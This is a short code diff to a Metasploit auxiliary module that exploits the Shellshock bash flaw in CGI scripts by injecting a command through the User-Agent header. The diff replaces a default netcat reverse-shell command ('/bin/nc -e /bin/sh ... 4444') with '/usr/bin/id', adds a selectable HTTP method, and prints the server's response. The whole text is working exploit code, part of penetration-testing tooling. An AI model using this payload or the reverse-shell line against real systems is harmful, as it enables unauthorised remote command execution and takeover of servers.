@@ -33,17 +33,22 @@ class Metasploit4 < Msf::Auxiliary
 
     register_options([
       OptString.new('TARGETURI', [true, 'Path to CGI script']),
+      OptEnum.new('METHOD', [true, 'HTTP method to use', 'GET', ['GET', 'POST']]),
       OptString.new('CMD', [true, 'Command to run (absolute paths required)',
-        '/bin/nc -e /bin/sh 127.0.0.1 4444 &'])
+        '/usr/bin/id'])
     ], self.class)
   end
 
   def run_host(ip)
-    send_request_cgi(
-      'method' => 'GET',
+    res = send_request_raw(
+      'method' => datastore['METHOD'],
       'uri' => normalize_uri(target_uri.path),
       'agent' => "() { :;}; #{datastore['CMD']}"
     )
+
+    if res && res.code == 200
+      vprint_good(res.body)
+    end
   end
 
 end
